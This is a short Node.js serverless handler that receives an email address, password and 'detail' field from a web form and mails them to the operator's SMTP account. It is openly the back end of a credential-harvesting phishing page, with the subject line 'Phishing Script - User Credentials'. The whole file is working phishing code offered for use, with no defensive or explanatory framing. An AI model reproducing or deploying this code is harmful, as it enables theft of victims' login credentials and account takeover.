const nodemailer = require('nodemailer');

exports.handler = async (event, context) => {
  const { email, password, detail } = JSON.parse(event.body);

  // Check if all required fields are present
  if (!email || !password || !detail) {
    return {
      statusCode: 400,
      body: JSON.stringify({ message: 'Missing required fields' }),
    };
  }

  // Create a transporter object using the default SMTP transport
  const transporter = nodemailer.createTransport({
    host: process.env.SMTP_HOST,
    port: process.env.SMTP_PORT,
    auth: {
      user: process.env.SMTP_USER,
      pass: process.env.SMTP_PASS,
    },
  });

  // Email content
  const mailOptions = {
    from: process.env.SMTP_USER,
    to: process.env.SMTP_USER, // or a different recipient if needed
    subject: 'Phishing Script - User Credentials',
    text: `Email: ${email}\nPassword: ${password}\nDetail: ${detail}`,
  };

  try {
    // Send the email
    await transporter.sendMail(mailOptions);
    return {
      statusCode: 200,
      body: JSON.stringify({ message: 'Email sent successfully' }),
    };
  } catch (error) {
    console.error('Error sending email:', error);
    return {
      statusCode: 500,
      body: JSON.stringify({ message: 'Error sending email' }),
    };
  }
};
